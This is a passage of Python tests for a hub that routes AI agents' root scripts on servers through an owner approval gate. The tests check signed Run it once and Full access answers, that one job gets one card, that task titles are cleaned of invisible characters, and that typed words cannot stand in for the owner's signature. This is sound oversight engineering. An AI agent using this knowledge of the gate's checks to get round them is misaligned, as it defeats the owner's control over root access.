            """A run's card; its line of the door's record names the task, or none."""
            fields = run_card(script=script, **more)
            hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{task}" if task else None, fields["door_call"]))
            return fields

        def raised(fields):
            return int(hub.t_raise_needs_you("manager", fields).split("N-")[1].split(".")[0])

        def refused(fields, words):
            with self.assertRaises(hub.ToolError) as caught:
                hub.t_raise_needs_you("manager", fields)
            self.assertIn(words, str(caught.exception))

        def open_cards(host="web-1"):
            return [r["id"] for r in hub.q("SELECT id FROM needs WHERE door_host=? AND answer IS NULL ORDER BY id",
                                           (host,))]
        first = raised(card("echo part one\n"))
        refused(card("echo part one\n"), f"N-{first} already asks the owner for this call. Raise no second card: "
                                         f"wait for the answer.")
        refused(card("echo part two\n", why="Part 2 of 2."),
                f"One job on one server is one card. N-{first} is open for a root script of the same task on web-1. "
                f"The agent sends the whole job as one script, and you raise its card with replaces set to N-{first}. "
                f"Never raise the parts of a script as several cards.")
        # another task, or another server, is another job
        rotate, elsewhere = raised(card("echo rotate\n", task=logs)), raised(card("echo part two\n", host="web-2"))
        # the whole job as one script, with replaces: one card is open, and the task of the first hears nothing
        heard = hub.q1("SELECT COUNT(*) n FROM events WHERE agent='vps'")["n"]
        whole = raised(card("echo part one\necho part two\n", replaces=f"N-{first}"))
        row = hub.q1("SELECT answer, replaced_by FROM needs WHERE id=?", (first,))
        self.assertEqual((row["answer"][:12], row["replaced_by"]), ("Replaced by ", whole))
        self.assertEqual(open_cards(), [rotate, whole])
        self.assertEqual(hub.q1("SELECT COUNT(*) n FROM events WHERE agent='vps'")["n"], heard)
        # a door card takes the place of a door card of its own server only
        refused(card("echo part three\n", host="web-2", replaces=f"N-{whole}"), "closes by its own route")
        # and of its own job only: replaces closes the old card with no word to its task (security review of 21
        # November 2026)
        refused(card("echo part three\n", replaces=f"N-{rotate}"), f"N-{rotate} is the door card of another job on "
                                                                     f"web-1")
        # after the owner's answer, and after a withdrawal, the next card of the job is taken: it is real work
        hub.q("UPDATE needs SET answer='Run it once', answered=? WHERE id=?", (hub.now(), whole))
        again = raised(card("echo part three\n"))
        hub.t_withdraw_need("manager", {"need": f"N-{again}", "why": "The agent found another way."})
        later = raised(card("echo part four\n"))
        # a card whose line of the door's record names no task: the job is the caller's on that server, and no task's,
        # so it neither waits for a task's card nor replaces one (security review, round 2): a card in the place of a
        # task's would let that task hear the answer to another call (review of 22 November 2026, round 2)
        loose = raised(card("echo clean up\n", task=None))
        refused(card("echo clean up more\n", task=None), f"N-{loose} is open for a root script of the same agent on "
                                                          f"web-1")
        refused(card("echo clean up more\n", task=None, replaces=f"N-{rotate}"), f"N-{rotate} is the door card of "
                                                                               f"another job on web-1")
        self.assertEqual((open_cards(), open_cards("web-2")), ([rotate, later, loose], [elsewhere]))
        # an item with no door call is replaced by a door card, as before one job was one card (review of 22 November
        # 2026: a bug that took it for the door card of another job refused it)
        hub.q("UPDATE needs SET answer='No', answered=? WHERE id=?", (hub.now(), elsewhere))
        plain = raised({"title": "Choose the plan", "why": "Two plans fit.", "what_to_do": "Say which one",
                        "reason": "money"})
        took = raised(card("echo look again\n", host="web-2", replaces=f"N-{plain}"))
        self.assertEqual(hub.q1("SELECT replaced_by FROM needs WHERE id=?", (plain,))["replaced_by"], took)
        self.assertEqual(open_cards("web-2"), [took])

    def test_the_door_s_card_names_the_task_that_asked_after_its_title(self):
        """Incident intake, part 3 (the owner, 14 November 2026, "Yes, as shown", to that title with the name of
        a server of his and of one of his tasks). On 13 November two cards for one server had one title. The title that the Mac
        signs under stays word for word, and the task's title is a field of its own beside it."""
        self.grant(agent="vps", server="web-1", level="fix")
        logs = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Read the checkout logs','vps','working')")
        long = hub.ins("INSERT INTO tasks(title,owner,state) VALUES(?,'vps','working')",
                       ("Move `uploads`\u202e to the  new\tdisk\nand check each one of the 4,000 files against its old copy",))
        other = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('A task of another agent','manager','working')")

        def raised(script, task=None, **more):
            card = run_card(script=script, **more)
            if task:
                hub.q("UPDATE door_record SET task=? WHERE call=?", (task, card["door_call"]))
            nid = int(hub.t_raise_needs_you("manager", card).split("N-")[1].split(".")[0])
            return hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        first, second = raised("journalctl -u app\n", f"T-{logs}"), raised("mv /srv/a /srv/b\n", f"T-{long}")
        self.assertEqual((first["title"], first["door_task"]), ("Run one root script on web-1?", "Read the checkout logs"))
        # owner API 1.280: the card names that task by its id too, for the mark that an app draws on the answered
        # card (the task's title alone finds no task: two tasks can have one title)
        self.assertEqual((first["task"], second["task"]), (logs, long))
        # one line of plain words, at most 60 characters: no backtick, no mark that turns the line, no line feed
        self.assertEqual(second["title"], first["title"])
        self.assertEqual(second["door_task"], "Move uploads to the new disk and check each one of the 4,00…")
        self.assertEqual(len(second["door_task"]), 60)
        self.assertEqual(hub.need_title(second), "Run one root script on web-1? · " + second["door_task"])
        # the owner's notice, the phone's ping and the hub's own page say both halves
        said = [e["text"] for e in hub.q("SELECT text FROM events WHERE agent='owner' AND kind='notify' ORDER BY id")]
        self.assertIn("Needs you: Run one root script on web-1? · Read the checkout logs", said)
        self.assertIn("Run one root script on web-1? · Read the checkout logs", hub.board_html())
        # a task of another agent that the caller named is not the task that asked: no second half. Each such card
        # is the caller's own job on web-1, so the one before it is answered first (one job is one open card).
        def alone(script, task=None):
            hub.q("UPDATE needs SET answer='No', answered=1 WHERE door_host='web-1' AND answer IS NULL")
            return raised(script, task)
        self.assertIsNone(alone("ls /root\n", f"T-{other}")["door_task"])
        self.assertIsNone(alone("ls /srv\n")["door_task"])                 # the call named no task
        self.assertIsNone(alone("ls /opt\n", "T-999999")["door_task"])      # and no task that is not there
        # a card that is not the door's card of a run has none
        plain = hub.t_raise_needs_you("manager", {"title": "Choose the plan", "why": "Two plans fit.",
                                                  "what_to_do": "Say which one", "reason": "money"})
        plain = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (int(plain.split("N-")[1].split(".")[0]),)))
        self.assertEqual((plain["door_task"], plain["task"]), (None, None))
        self.assertEqual(hub.need_title({"title": "Choose the plan"}), "Choose the plan")
        # two agents sent one script to one server, and the item carries the question of one of them: its own line
        # says its task, also when the other agent's line is the newer one; with no line of its own, the task of
        # the question
        self.grant(agent="dev", server="web-1", level="fix")
        mine = hub.ins("INSERT INTO tasks(title,owner,state,requester) VALUES('Check the disk','vps','working','manager')")
        theirs = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Another agent looks too','dev','working')")
        asked = hub.ins("INSERT INTO questions(task,asker,requester,text,asked) VALUES(?,?,?,?,?)",
                        (mine, "vps", "manager", "The door refused my script.", 1.0))
        card = run_card(script="df -h\n")
        hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{mine}", card["door_call"]))
        n = hub.q1("SELECT MAX(n) n FROM door_record")["n"] + 1
        hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why,call,task) VALUES(?,?,?,?,?,?,?,?,?,?)",
              (n, float(n), "dev", "web-1", "run", "refused", "refused", "the door's words", card["door_call"],
               f"T-{theirs}"))
        nid = int(hub.t_raise_needs_you("manager", dict(card, question_id=f"Q-{asked}")).split("N-")[1].split(".")[0])
        row = hub.q1("SELECT * FROM needs WHERE id=?", (nid,))
        self.assertEqual((row["door_task"], row["door_task_id"]), ("Check the disk", mine))
        hub.q("UPDATE needs SET answer='No', answered=1 WHERE id=?", (nid,))
        hub.q("UPDATE door_record SET task=NULL WHERE call=? AND caller='vps'", (card["door_call"],))
        nid = int(hub.t_raise_needs_you("manager", dict(card, question_id=f"Q-{asked}")).split("N-")[1].split(".")[0])
        self.assertEqual(hub.q1("SELECT door_task FROM needs WHERE id=?", (nid,))["door_task"], "Check the disk")
        hub.q("UPDATE needs SET answer='No', answered=1 WHERE id=?", (nid,))
        hub.q("DELETE FROM door_record WHERE call=? AND caller='vps'", (card["door_call"],))    # only the other's line
        refusal(hub.door_call_hash("web-1", "run", [], b"true\n"), "web-1", "run")              # (the record is read)
        nid = int(hub.t_raise_needs_you("manager", dict(card, question_id=f"Q-{asked}")).split("N-")[1].split(".")[0])
        self.assertEqual(hub.q1("SELECT door_task FROM needs WHERE id=?", (nid,))["door_task"], "Check the disk")
        # the door's line gives the task: the hub keeps it with the line, and only a task's code. The words are one
        # line with no character that is known to draw nothing
        self.assertEqual([hub.door_task_words(x) for x in ("", None, " \n ", "`", "a  b")], [None, None, None, None, "a b"])
        self.assertEqual(hub.door_task_words("Read\u3164 the\u2800 l\u034fo\ufe0fgs\u115f"), "Read the logs")
        self.assertTrue(hub.DOOR_TASK.fullmatch("T-12") and not hub.DOOR_TASK.fullmatch("T-0") and
                        not hub.DOOR_TASK.fullmatch("T-12; x"))

    def test_the_hub_says_when_the_door_took_full_access_and_when_it_did_not(self):
        """Incident intake, part 3. On 13 November 2026 the owner's signed Full access was at the door 80 seconds
        after his press, and nothing told the agent that had asked, or the manager. The door's own word comes with
        each read of its record: when it turns to Full access, the task of the card hears it one time, and so does
        each other open task whose root script the door refused there (on 20 November 2026 a second task that no card
        named waited on reminders, asked three times and ended as failed); and when the door has read a fresh
        statement of the hub two times and keeps none of that time, the manager hears that one time."""
        self.grant(agent="vps", server="web-1", level="fix")
        task = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Read the checkout logs','vps','working')")
        once = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Rotate the logs','vps','working')")
        ended = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('An older task','vps','completed')")
        fleet, t = hub.fleet_id(), time.time()

        def answered(script, of, statement, received):
            card = run_card(script=script)
            hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{of}", card["door_call"]))
            nid = int(hub.t_raise_needs_you("manager", card).split("N-")[1].split(".")[0])
            hub.q("UPDATE needs SET approval=?, answer='answered', chosen=1, answered=? WHERE id=?",
                  (json.dumps({"statement": json.dumps(statement, sort_keys=True, separators=(",", ":")),
                               "signature": "c2ln"}), received, nid))
            return nid

        def mode(at):
            return {"v": 1, "kind": "door-mode", "fleet": fleet, "host": "web-1", "mode": "full", "at": at}
        first = int(t) - 200
        full = answered("journalctl -u app\n", task, mode(first), t - 190)
        answered("ls /srv\n", ended, mode(first - 50), t - 195)
        # a signed Run it once is no Full access: its task hears nothing, or its script would run two times
        answered("logrotate -f /etc/logrotate.conf\n", once,
                 {"v": 1, "kind": "door-call", "fleet": fleet, "need": 0, "call": "ab" * 32, "at": first}, t - 185)
        # a task that no card names hears it as the card's task does: its newest root script there was refused for
        # want of the owner's word (door_full_waiting has the other cases)
        fixes = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Ship the waiting fixes','vps','working')")
        script = b"apt-get install --only-upgrade openssl\n"
        n = (hub.q1("SELECT MAX(n) n FROM door_record")["n"] or 0) + 1
        hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why,call,task) VALUES(?,?,?,?,?,?,?,?,?,?)",
              (n, t - 150, "vps", "web-1", "run", "refused", "refused", f"run {door_targets.NO_BOX}, which no grant on "
               f"web-1 covers.", hub.door_call_hash("web-1", "run", [], script), f"T-{fixes}"))

        def said(agent):
            return [(r["task"], r["text"]) for r in hub.q("SELECT task, text FROM events WHERE agent=? AND kind='say' "
                                                          "AND text LIKE '%door%' ORDER BY id", (agent,))]

        def word(at, t0, mode="full"):
            hub.door_modes_said({"modes": {"web-1": {"mode": mode, "at": at}} if mode else {}}, t0)
        word(None, t - 180, "auto")                                     # the door's first word: no news
        self.assertEqual((said("vps"), said("manager")), ([], []))
        hub.DOOR.pop("approvals_at", None)
        self.assertEqual(self.request("/door/approvals", source=DOOR)[0], 200)      # the door reads the statements
        self.assertGreaterEqual(hub.DOOR["approvals_at"], t)
        word(first, t + 5)
        word(first, t + 65)
        news = ("[hub] The door has the owner's Full access on web-1 now: a root script with no box runs there with no "
                "card. If the door refused your call, send it again; a call that ran needs nothing more.")
        self.assertEqual(said("vps"), [(task, news), (fixes, news)])
        self.assertEqual(said("lead"), [])
        # a read in which the door names no server, and the next one: no news a second time
        word(None, t + 70, None)
        word(first, t + 75)
        self.assertEqual(len(said("vps")), 2)
        self.assertEqual(said("manager"), [])                           # an old statement that the door keeps
        # a fresh statement that is not in effect at the door: the owner set Auto, and the door still says Full access
        def kept(statement, received):
            hub.q("UPDATE needs SET approval=?, answered=? WHERE id=?",
                  (json.dumps({"statement": json.dumps(statement, sort_keys=True, separators=(",", ":")),
                               "signature": "c2ln"}), received, full))
        second = int(t) - 20
        kept(dict(mode(second), mode="auto"), t - 10)
        self.assertEqual(hub.door_modes_held()["web-1"]["mode"], "auto")
        hub.DOOR["approvals_at"] = t - 15                               # the door's last read was before it came
        word(first, t + 80)
        word(first, t + 140)
        self.assertEqual(said("manager"), [])
        hub.DOOR["approvals_at"] = t + 141
        word(first, t + 145)                                            # the first read that shows it: not yet
        self.assertEqual(said("manager"), [])
        word(first, t + 205)
        word(first, t + 265)
        told = said("manager")
        self.assertEqual(len(told), 1)
        self.assertIn("[hub] The owner's Auto on web-1 is not in effect at the door", told[0][1])
        self.assertIn("it still says Full access for that server. The door's own log says why", told[0][1])
        # the door says Auto: nothing more
        word(second, t + 325, "auto")
        self.assertEqual((len(said("manager")), len(said("vps"))), (1, 2))
        # a newer Full access that the door honours with the statement before it is in effect: no word to the
        # manager, and the task of that very card hears of it one time, as the task whose call is still refused does
        kept(mode(int(t) - 5), t - 3)
        hub.DOOR["approvals_at"] = t + 330
        word(first, t + 385)
        word(first, t + 445)
        self.assertEqual((len(said("manager")), len(said("vps"))), (1, 4))
        # a statement that is not fresh, or of a server that no agent holds at Fix, is no news: the door says the
        # same of a statement that it took and does not honour
        hub.kv_set("door_untaken:web-1", "")
        kept(dict(mode(int(t) - 1), mode="auto"), t - 2 * hub.DOOR_UNTAKEN_FRESH)
        word(first, t + 505)
        word(first, t + 565)
        self.assertEqual(len(said("manager")), 1)
        kept(dict(mode(int(t) - 1), mode="auto"), t - 2)
        self.grant(agent="vps", server="web-1", level="read")
        word(first, t + 625)
        word(first, t + 685)
        self.assertEqual(len(said("manager")), 1)

    def test_full_access_reaches_each_task_that_waits_for_it_and_no_other(self):
        """door_full_waiting: the tasks that hear of Full access on a server beside the task of the card (20 November
        2026: a task that no card named waited on reminders, asked three times and ended as failed). Each open task of
        an agent that holds the server at Fix whose newest root script there the door refused in the last week for
        want of the owner's word alone. Not a call that ran after its refusal; not another agent's task, also when a
        caller names it; not another server or form; not a refusal of a window, which Full access does not lift; not an
        older refusal or an ended task; not a call that the owner answered No on a card of that task, also when the
        task tries it again (RULES.md rule 5); and not one whose Run it once came after its refusal. A Run it once
        from before the refusal, which the door used, and one of another task with the same script, hide nothing."""
        self.grant(agent="vps", server="web-1", level="fix")
        t, no_box = time.time(), f"run {door_targets.NO_BOX}, which no grant on web-1 covers."

        def task(title, owner="vps", state="working"):
            return hub.ins("INSERT INTO tasks(title,owner,state) VALUES(?,?,?)", (title, owner, state))

        def line(of, script, at, kind="refused", caller="vps", target="web-1", action="run", why=no_box):
            n = (hub.q1("SELECT MAX(n) n FROM door_record")["n"] or 0) + 1
            hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why,call,task) "
                  "VALUES(?,?,?,?,?,?,?,?,?,?)", (n, at, caller, target, action, kind,
                                                 "refused" if kind == "refused" else "done", why,
                                                 hub.door_call_hash(target, action, [], script.encode()), f"T-{of}"))

        def answer(of, script, at, words):
            """The owner's answer at `at` to the card of task `of`'s run of this script: No, or Run it once."""
            card = {"title": "Run one root script on web-1?", "why": "Vps must run one script.",
                    "what_to_do": "Answer Run it once, or Full access on web-1", "door_host": "web-1",
                    "door_call": hub.door_call_hash("web-1", "run", [], script.encode()), "door_script": script}
            nid = int(hub.t_raise_needs_you("manager", card).split("N-")[1].split(".")[0])
            approval = None if words == "No" else json.dumps({"statement": json.dumps(
                {"v": 1, "kind": "door-call", "fleet": hub.fleet_id(), "need": nid, "call": card["door_call"],
                 "at": int(at)}, sort_keys=True, separators=(",", ":")), "signature": "c2ln"})
            hub.q("UPDATE needs SET approval=?, answer=?, answered=? WHERE id=?", (approval, words, at, nid))
            self.assertEqual(hub.q1("SELECT door_task_id FROM needs WHERE id=?", (nid,))["door_task_id"], of)
        waiting = task("Ship the waiting fixes")
        line(waiting, "apt-get install --only-upgrade openssl\n", t - 150)
        ran = task("Clear the cache")
        line(ran, "rm -rf /srv/cache/tmp\n", t - 150)
        line(ran, "rm -rf /srv/cache/tmp\n", t - 140, kind="own")
        lead = task("Read the disk", owner="lead")
        line(lead, "df -h\n", t - 150, caller="lead")                  # lead holds web-1 at no level
        line(task("Another agent's task", owner="lead"), "du -sh /srv\n", t - 150)     # vps names lead's task
        line(task("Read web-2"), "uptime\n", t - 150, target="web-2")
        line(task("A script in the box"), "ls /srv\n", t - 150, action="script")
        line(task("Restart at night"), "systemctl restart app\n", t - 150,
             why="a restart on web-1 runs only inside its window (22:00-23:00 UTC)")
        line(task("Read last month"), "cat /var/log/syslog\n", t - hub.DOOR_APPROVAL_DAYS * 86400 - 60)
        line(task("An ended task", state="completed"), "free -m\n", t - 150)
        declined = task("Move the uploads")
        line(declined, "mv /srv/app/uploads /srv/app/uploads-old\n", t - 150)
        answer(declined, "mv /srv/app/uploads /srv/app/uploads-old\n", t - 100, "No")
        line(declined, "mv /srv/app/uploads /srv/app/uploads-old\n", t - 50)        # tried again after the No
        once, twin = task("Rotate the logs"), task("Rotate the logs too")
        line(twin, "logrotate -f /etc/logrotate.conf\n", t - 160)
        line(once, "logrotate -f /etc/logrotate.conf\n", t - 150)
        answer(once, "logrotate -f /etc/logrotate.conf\n", t - 100, "Run it once")
        again = task("Prune the journal")
        line(again, "journalctl --vacuum-time=7d\n", t - 400)
        answer(again, "journalctl --vacuum-time=7d\n", t - 300, "Run it once")      # used: the door ran it
        line(again, "journalctl --vacuum-time=7d\n", t - 150)
        self.assertEqual([r["id"] for r in hub.door_full_waiting("web-1", t)], sorted([waiting, twin, again]))

    def test_the_words_of_a_signed_answer_do_not_close_the_door_s_card(self):
        """Words are no signature. An answer in words closes an item as a press does, so the words of Run it once or
        of Full access on <server>, sent as text, would close the door's card and give the door nothing. They get the
        refusal of the unsigned press, and the card stays open."""
        self.grant(agent="vps", server="web-1", level="fix")
        nid = int(hub.t_raise_needs_you("manager", run_card()).split("N-")[1].split(".")[0])
        for words, where in (("Full access on web-1", "on the Mac."), ("full access on WEB-1.", "on the Mac."),
                             ("  Full   access\ton web-1 ", "on the Mac."), ('"Full access on web-1"', "on the Mac."),
                             ("Full access on web_1!", "on the Mac."), ("Run it once", "Founderizer."),
                             ("run it once!", "Founderizer."), ("RUN IT ONCE", "Founderizer.")):
            with self.subTest(words=words):
                status, answer = self.owner(f"/ui/needs/{nid}", answer=words)
                self.assertEqual(status, 409, answer)
                self.assertIn("needs the signature of the owner's key, and words carry none", answer["error"])
                self.assertTrue(answer["error"].endswith("Press that answer in Founderizer " + where
                                                         if where == "on the Mac." else
                                                         "Press that answer in Founderizer."), answer)
                row = hub.q1("SELECT answer, approval FROM needs WHERE id=?", (nid,))
                self.assertEqual((row["answer"], row["approval"]), (None, None))
        # the old board of the hub's own pages signs nothing: neither a press nor the words close the card there
        def board(item, **form):
            """One press or one written answer on the hub's own page, with no redirect back to the page followed."""
            import urllib.error
            import urllib.parse
            import urllib.request

            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *_args):
                    return None
            req = urllib.request.Request(self.base + f"/needs/{item}", data=urllib.parse.urlencode(form).encode(),
                                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                                  "X-Test-Source": OWNER})
            try:
                with urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect).open(req, timeout=5) as r:
                    return r.status
            except urllib.error.HTTPError as r:
                with r:
                    return r.code
        for form in ({"choice": "0"}, {"choice": "1"}, {"answer": "Run it once"}, {"answer": "full access on web-1"}):
            self.assertEqual(board(nid, **form), 303)
            self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"], form)
        # words that are no signed answer close the card, as they close every item: the manager reads them
        status, answer = self.owner(f"/ui/needs/{nid}", answer="Full access on web-1 for today only, then Auto")
        self.assertEqual(status, 200, answer)
        self.assertEqual(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"],
                         "Full access on web-1 for today only, then Auto")
        # a card that is answered says so, also to the words of a signed answer
        status, answer = self.owner(f"/ui/needs/{nid}", answer="Run it once")
        self.assertEqual((status, answer["error"]), (409, "owner request is already answered"))
        # No needs no signature: its word closes the card, as its button does, on the board too
        no = int(hub.t_raise_needs_you("manager", run_card(script="id\n")).split("N-")[1].split(".")[0])
        self.assertEqual(self.owner(f"/ui/needs/{no}", answer="no")[0], 200)
        third = int(hub.t_raise_needs_you("manager", run_card(script="uptime\n")).split("N-")[1].split(".")[0])
        self.assertEqual(board(third, choice="2"), 303)
        self.assertEqual(hub.q1("SELECT answer FROM needs WHERE id=?", (third,))["answer"], "No")
        # an item with a door call and no server (a delete that is the owner's): its first answer is the signed one,
        # whatever its words are, and its second one is free
        call = refusal("b" * 64, "hetzner:acme", "change")
        free = int(hub.t_raise_needs_you("manager", {"title": "Delete the old server?", "why": "It is not used.",
                                                     "what_to_do": "Say yes or no", "door_call": call,
                                                     "options": ["Yes, delete it", "Keep it"]}
                                         ).split("N-")[1].split(".")[0])
        status, answer = self.owner(f"/ui/needs/{free}", answer="yes delete it")
        self.assertEqual(status, 409, answer)
        self.assertTrue(answer["error"].startswith('"Yes, delete it" needs the signature of the owner\'s key'), answer)
        self.assertEqual(self.owner(f"/ui/needs/{free}", answer="Keep it")[0], 200)
        # an item that is no door card takes the same words as any answer
        plain = int(hub.t_raise_needs_you("manager", {"title": "Which mode?", "why": "One of two.",
                                                      "what_to_do": "Pick one", "reason": "person",
                                                      "options": ["Run it once", "Full access on web-1"]}
                                          ).split("N-")[1].split(".")[0])
        self.assertEqual(self.owner(f"/ui/needs/{plain}", answer="Run it once")[0], 200)

    def test_full_access_on_a_server_is_the_second_answer_of_the_door_s_card(self):
        """The door-modes proposal, step 4 (the owner's "Yes, as shown", 11 November 2026): a door card names the
        run's call hash and its server, and the hub writes its three answers. The Mac signs Full access on <server> as
        that server's mode, the hub keeps it with his answer, and only the door's address reads it: the newest mode of
        each server, of any age, beside his yeses of the last days."""
        self.grant(agent="vps", server="web-1", level="fix")
        card = run_card()
        call, base = card["door_call"], {k: v for k, v in card.items() if k != "door_host"}
        for bad in ({"door_host": "web-9"}, {"door_host": "Web 1"}, {"door_host": "web-1", "door_call": None},
                    {"door_host": "web-1", "door_script": None},      # the door's card always carries its script
                    {"door_host": "web-1", "options": ["Yes", "No"]}, {"door_host": "web-1", "multi": True}):
            with self.subTest(bad=bad), self.assertRaises(hub.ToolError):
                hub.t_raise_needs_you("manager", dict(base, **bad))
        said = hub.t_raise_needs_you("manager", dict(base, door_host="web-1"))
        self.assertIn("When they press Full access on web-1, their Mac signs that server's mode", said)
        nid = int(said.split("N-")[1].split(".")[0])
        item = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        self.assertEqual((item["options"], item["door_host"], item["door_call"]),
                         (["Run it once", "Full access on web-1", "No"], "web-1", call))
        self.assertIn("door_modes", self.request(source=OWNER)[1]["ui_features"])
        fleet = hub.fleet_id()
        mode = json.dumps({"v": 1, "kind": "door-mode", "fleet": fleet, "host": "web-1", "mode": "full", "at": 5},
                          sort_keys=True, separators=(",", ":"))
        yes = json.dumps({"v": 1, "kind": "door-call", "fleet": fleet, "need": nid, "call": call,
                          "at": round(hub.now())}, sort_keys=True, separators=(",", ":"))
        for wrong, choice, why in ((mode.replace("web-1", "web-2"), 1, "Full access on this item's server"),
                                   (mode.replace('"full"', '"auto"'), 1, "Full access on this item's server"),
                                   (mode + " ", 1, "canonical form"), (mode, 0, "not a door-call statement"),
                                   # the checks of the server's own row (version 1.125): the form, the fleet, the time
                                   (mode.replace('"v":1', '"v":true'), 1, "canonical form"),
                                   (mode.replace('"v":1', '"v":1.0'), 1, "canonical form"),
                                   (mode.replace(f'"{fleet}"', "5"), 1, "canonical form"),
                                   (mode.replace(fleet, "another-fleet"), 1, "not of this fleet"),
                                   (mode.replace('"at":5', f'"at":{round(hub.now()) + 3600}'), 1, "in the future"),
                                   (yes, 2, "only the first option, the yes, carries a signed statement, and Full "
                                            "access on web-1 its signed mode")):
            status, answer = self.owner(f"/ui/needs/{nid}", choice=choice, statement=wrong, signature="c2ln")
            self.assertEqual(status, 400, answer)
            self.assertIn(why, answer["error"])
        status, answer = self.owner(f"/ui/needs/{nid}", choice=1)
        self.assertEqual(status, 409, answer)
        self.assertIn("Full access on web-1 sets that server's mode", answer["error"])
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        status, answer = self.owner(f"/ui/needs/{nid}", choice=1, statement=mode, signature="c2ln")
        self.assertEqual(status, 200, answer)
        self.assertEqual(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"], "Full access on web-1")
        status, answer = self.request("/door/approvals", source=DOOR)
        self.assertEqual((status, answer["approvals"], answer["modes"]),
                         (200, [], [{"statement": mode, "signature": "c2ln"}]))
        later = hub.t_raise_needs_you("manager", run_card(script="id\n"))
        newer = mode.replace('"at":5', '"at":9')
        later_id = int(later.split("N-")[1].split(".")[0])
        for old in (mode, mode.replace('"at":5', '"at":4')):    # not newer than the one that the hub carries
            status, answer = self.owner(f"/ui/needs/{later_id}", choice=1, statement=old, signature="c2ln")
            self.assertEqual(status, 400, answer)
            self.assertIn("the door takes only a newer one", answer["error"])
        status, answer = self.owner(f"/ui/needs/{later_id}", choice=1, statement=newer, signature="c2ln")
        self.assertEqual(status, 200, answer)
        once_card = run_card(script="uptime\n")
        once = hub.t_raise_needs_you("manager", once_card)
        once_id = int(once.split("N-")[1].split(".")[0])
        yes = json.dumps({"v": 1, "kind": "door-call", "fleet": hub.fleet_id(), "need": once_id,
                          "call": once_card["door_call"], "at": round(hub.now())},
                         sort_keys=True, separators=(",", ":"))
        self.assertEqual(self.owner(f"/ui/needs/{once_id}", choice=0, statement=yes, signature="c2ln")[0], 200)
        answer = self.request("/door/approvals", source=DOOR)[1]
        self.assertEqual(answer["modes"], [{"statement": newer, "signature": "c2ln"},         # the newest of web-1
                                           {"statement": mode, "signature": "c2ln"}])         # first, then the older
        self.assertEqual(answer["approvals"], [{"need": once_id, "statement": yes, "signature": "c2ln"}])

    def mode_of(self, host, mode, at, fleet=None):
        return json.dumps({"v": 1, "kind": "door-mode", "fleet": fleet or hub.fleet_id(), "host": host, "mode": mode,
                           "at": at}, sort_keys=True, separators=(",", ":"))

    def set_mode(self, statement, host="web-1", signature="c2lnbmF0dXJl", **more):
        return self.owner("/ui/door/mode", **dict({"host": host, "statement": statement, "signature": signature},
                                                  **more))

    def served(self, host="web-1"):
        """The statements of one server that the door gets, in the order of the hub's answer."""
        status, answer = self.request("/door/approvals", source=DOOR)
        self.assertEqual(status, 200, answer)
        return [m["statement"] for m in answer["modes"] if json.loads(m["statement"])["host"] == host]

    def app_server(self, name="web-1"):
        status, view = self.request("/ui/servers?db=test-generation", source=OWNER)
        self.assertEqual(status, 200, view)
        return next(s for s in view["apps"] if s["name"] == name)

    def test_the_owner_sets_a_server_s_mode_with_no_needs_you_item(self):
        """Owner feature door_mode_set (the owner's "Yes, as shown" of 11 November 2026 to the row "Managed by
        <agent>" with Auto and Full access): his Mac signs the server's mode, the hub checks its form and carries it,
        and the door gets the newest statement of each server, from this route or from the door's card. The hub
        checks no signature: every signature below is no signature at all, and the hub takes it."""
        self.assertIn("door_mode_set", self.request(source=OWNER)[1]["ui_features"])
        t = round(hub.now())
        full, auto = self.mode_of("web-1", "full", t - 100), self.mode_of("web-1", "auto", t - 50)
        status, answer = self.set_mode(full)
        self.assertEqual(status, 409, answer)                   # no agent holds web-1 yet
        self.assertIn("no agent holds web-1 at Fix through the door", answer["error"])
        # An Auto is taken for every server's name, also one that no agent holds and that the hub knows nothing of:
        # it opens nothing, and the door may keep a Full access that a restored hub no longer carries.
        lost = self.mode_of("db-9", "auto", t - 300)
        self.assertEqual(self.set_mode(lost, host="db-9")[0], 200)
        self.assertEqual(self.served("db-9"), [lost])
        self.grant(agent="vps", server="web-1", level="read")
        self.assertEqual(self.set_mode(full)[0], 409)           # Read is no holder of a mode
        self.grant(agent="vps", server="web-1", level="fix")
        self.assertEqual((self.app_server()["mode"], self.app_server()["mode_at"], self.app_server()["mode_door"]),
                         ("auto", None, None))
        for bad, why in ((full + " ", "canonical form"), (full.replace('"v":1', '"v":2'), "canonical form"),
                         (full.replace("door-mode", "door-call"), "canonical form"),
                         (full.replace('"full"', '"off"'), "canonical form"),
                         (full.replace(str(t - 100), f"{t - 100}.5"), "canonical form"),
                         (full.replace(str(t - 100), "true"), "canonical form"),
                         (full.replace(str(t - 100), f'"{t - 100}"'), "canonical form"),
                         (full[:-1] + ',"need":1}', "canonical form"), ("[]", "canonical form"),
                         (json.dumps(json.loads(full)), "canonical form"),
                         (self.mode_of("web-2", "full", t), "not of this server")):
            with self.subTest(bad=bad):
                status, answer = self.set_mode(bad)
                self.assertEqual(status, 400, answer)
                self.assertIn(why, answer["error"])
        for bad in ({"signature": "not base64!"}, {"signature": ""}, {"signature": None}, {"host": "Web 1"},
                    {"mode": "full"}, {"statement": None}, {"statement": 5}):
            with self.subTest(bad=bad):
                self.assertEqual(self.set_mode(bad.get("statement", full), **{k: v for k, v in bad.items()
                                                                              if k != "statement"})[0], 400)
